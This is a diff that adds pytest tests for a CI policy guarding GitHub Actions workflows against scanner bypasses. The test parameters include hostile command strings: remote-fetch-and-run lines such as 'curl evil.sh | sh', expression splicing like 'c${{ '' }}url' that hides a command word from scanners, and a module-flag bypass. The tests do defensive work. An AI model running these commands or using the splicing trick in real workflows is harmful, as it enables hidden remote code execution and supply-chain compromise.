@@ -6805,3 +6805,137 @@ def test_expression_path_requires_a_parseable_body() -> None:
 def test_non_bash_shell_path_does_not_require_a_parseable_body() -> None:
     """A Python step is legitimately unparseable as Bash and stays tolerated."""
     assert policy._step_defeats_bash_subparse("python3 {0}", "print(os.getcwd())\n") is True
+
+
+# ---------------------------------------------------------------------------
+# Adversarial review of the Semgrep gate (PR #3688). Four bypasses, each with a
+# negative control proving the fix does not over-tighten. Refs #3673.
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "python3 -mevil {0}",
+        "python -mhttp.server {0}",
+        "python3 -c print(1) {0}",
+        "PYTHON3 -MEVIL {0}",
+    ],
+)
+def test_unreviewed_interpreter_flag_is_not_a_reviewed_shell(shell: str) -> None:
+    """CPython runs ``-m`` and ignores the script, so the step is not reviewed.
+
+    Before the fix a generic flag regex accepted any ``-x`` token, so this
+    classified as a reviewed non-Bash interpreter and skipped every Bash rule
+    while the runner executed the attacker's module. CWE-78.
+    """
+    assert policy._is_non_bash_shell(shell) is False
+
+
+@pytest.mark.parametrize(
+    "shell",
+    [
+        "python3 {0}",
+        "pwsh -NoProfile -Command \"& '{0}'\"",
+        "pwsh -noprofile -nologo -command \"& '{0}'\"",
+        "pwsh",
+    ],
+)
+def test_reviewed_interpreter_invocations_stay_tolerated(shell: str) -> None:
+    """Negative control: every shell value used in this repository still passes."""
+    assert policy._is_non_bash_shell(shell) is True
+
+
+@pytest.mark.parametrize(
+    "run",
+    [
+        "c${{ '' }}url https://evil.sh | sh",
+        "echo hi; c${{ '' }}url x | sh",
+        "foo && b${{ '' }}ash -c evil",
+        "wget x\nc${{ '' }}url y | sh",
+    ],
+)
+def test_expression_spliced_into_a_command_word_denies_the_tolerance(run: str) -> None:
+    """Actions reassembles the command after every scanner has read the text.
+
+    The body parses as Bash and carries an expression, so the tolerance used to
+    excuse the Semgrep error and the hidden ``curl | sh`` shipped. CWE-78.
+    """
+    assert policy._splices_expression_into_command_word(run) is True
+    assert policy._step_defeats_bash_subparse("bash", run) is False
+
+
+@pytest.mark.parametrize(
+    "run",
+    [
+        'echo "#${{ github.event.pull_request.number }}"',
+        "gh pr view ${{ github.sha }}",
+        'echo "quarterly-${{ github.run_id }}"',
+        "curl ${{ github.server_url }}/${{ github.repository }}/x",
+        "${{ inputs.cmd }} --flag",
+        "echo no expression here",
+    ],
+)
+def test_argument_position_expressions_keep_the_tolerance(run: str) -> None:
+    """Negative control: the shapes real workflows use are untouched.
+
+    All 17 expression-bearing Bash steps in ``.github/workflows`` place the
+    expression in argument or string position. None is denied by the new rule.
+    """
+    assert policy._splices_expression_into_command_word(run) is False
+
+
+def test_wildcard_line_requires_a_printable_anchor() -> None:
+    """A run of non-ASCII plus spaces matched an unrelated command line.
+
+    Non-ASCII runs act as wildcards, so ``'\u2713 \u2713 \u2713'`` aligned with
+    ``curl evil.sh | sh`` and marked a real finding as an expected line.
+    """
+    assert (
+        policy._semgrep_line_matches_pattern(
+            "\u2713 \u2713 \u2713", "curl evil.sh | sh", allow_expected_suffix=False
+        )
+        is False
+    )
+
+
+@pytest.mark.parametrize(
+    ("expected", "actual"),
+    [
+        ("", ""),
+        ("echo hi", "echo hi"),
+        ("  echo hi", "  echo hi"),
+        ("echo \u2713 done", "echo \u2713 done"),
+    ],
+)
+def test_anchor_guard_leaves_ordinary_lines_matching(expected: str, actual: str) -> None:
+    """Negative control: blank interior lines of a ``run:`` block still match.
+
+    ``_semgrep_snippet_matches_run`` splits the body on newlines, so an empty
+    expected line is normal. Requiring an anchor unconditionally would have
+    dropped every step containing a blank line.
+    """
+    assert (
+        policy._semgrep_line_matches_pattern(expected, actual, allow_expected_suffix=False)
+        is True
+    )
+
+
+def test_char_index_map_matches_the_per_offset_converter() -> None:
+    """The single-pass map is exactly equivalent, including the rejections."""
+    raw = "a\u00e9b\u20acc\U0001f600d\ne\u00e9\n".encode()
+    mapping = policy._utf8_char_index_map(raw)
+    assert mapping is not None
+    for offset in range(-2, len(raw) + 3):
+        assert mapping.get(offset) == policy._byte_offset_to_char_index(raw, offset)
+
+
+def test_char_index_map_declines_a_file_that_is_not_utf8() -> None:
+    """A file that fails to decode falls back to the per-offset path.
+
+    Returning a partial map would turn an offset inside the decodable prefix
+    into ``None``, which drops the span and blocks the push.
+    """
+    raw = b"abc\xff\xfedef"
+    assert policy._utf8_char_index_map(raw) is None
+    assert policy._byte_offset_to_char_index(raw, 3) == 3
